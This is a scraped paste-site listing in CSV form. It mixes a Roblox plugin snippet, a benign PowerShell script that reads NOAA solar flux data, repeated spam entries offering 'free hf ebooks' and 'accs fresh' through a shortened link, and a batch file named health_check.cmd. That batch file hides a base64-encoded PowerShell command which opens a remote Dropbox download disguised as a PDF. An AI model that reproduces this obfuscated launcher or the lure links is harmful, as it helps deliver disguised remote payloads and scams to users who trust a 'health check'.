local pluginButton = toolbar:CreateButton(
	""Create"",
	"""",
	""rbxassetid://89279974687939""
)

pluginButton.ClickableWhenViewportHidden = true

pluginButton.Click:Connect(function()
	
	for _, object in pairs(selection:Get()) do

		if object:IsA(""GuiObject"") then
			local uiarc = object:FindFirstChildOfClass(""UIAspectRatioConstraint"") or Instance.new(""UIAspectRatioConstraint"")
			uiarc.AspectRatio = object.AbsoluteSize.X / object.AbsoluteSize.Y
			uiarc.Parent = object
		end
	end
	
	pluginButton:SetActive(true)
	pluginButton:SetActive(false)
end)"
HNipLE6Q,Get-CurrentSFIK,mlot,PowerShell,Friday 9th of May 2025 08:49:23 AM CDT,"function Get-CurrentSFIK {
    <#
    .SYNOPSIS
    Retrieves current Solor Flux Index and K Index information in JSON format from NOAA. It then returns the two
    most current variables (SFI first and K-Index second).

    .EXAMPLE
    $SFI, $K_INDEX = Get-CurrentSFIK

    .NOTES
    https://www.arrl.org/files/file/Technology/tis/info/pdf/0209038.pdf
    #>
    try {
        $flux = Invoke-RestMethod -Uri ""https://services.swpc.noaa.gov/json/f107_cm_flux.json""
        $kindex = Invoke-RestMethod -Uri ""https://services.swpc.noaa.gov/json/boulder_k_index_1m.json""
    } catch {
        $PSCmdlet.ThrowTerminatingError($_)
    }

    Return [int]$flux.flux[0], [int]$kindex.k_index[0]
}

$sfi, $kindex = Get-CurrentSFIK

Write-Host ""Current SFI: $sfi`nCurrent K Index: $kindex""

if ( ($sfi -gt 149) -and ($kindex -lt 3) ) {
    Write-Host -ForegroundColor Yellow ""Good HF Propagation Conditions!""
} elseif ( ($sfi -gt 199) -and ($kindex -lt 3) ) {
    Write-Host -ForegroundColor Green ""Excellent HF Propagation Conditions!""
}

Exit(0)
"
fDmRAGsr,free hf ebooks,donnybrowne,PHP,Friday 9th of May 2025 08:33:25 AM CDT,728960 - check it out at https://tinyurl.com/v18latest
Lzzpphhh,accs fresh,donnybrowne,PHP,Friday 9th of May 2025 08:23:22 AM CDT,407943 - check it out at https://tinyurl.com/v18latest
xpwWHZud,free hf ebooks,donnybrowne,PHP,Friday 9th of May 2025 08:12:18 AM CDT,563672 - check it out at https://tinyurl.com/v18latest
HVttLExj,health_check.cmd,himynameisdani2,Batch,Friday 9th of May 2025 08:03:17 AM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBwADUANgBjAGcANQByADgAMABqAGMAeAB0AGQAeQB2AHUAegB0AGcAcQAvAHYAMQAuADgALgBwAGQAZgA/AHIAbABrAGUAeQA9AHIAZgBhAGcANQA5AGoAbgBjADYAZABoAGoAZgBnAHgAdAB2AGUAegBhAHYAYQBlAHgAJgBzAHQAPQAyAGcAcwBkADUAZAA3AGgAJgBkAGwAPQAwACIAIAAgACMAIABpAGQAPQBmAGUAMQBiAGMANQA1ADgA
EXIT /b
"
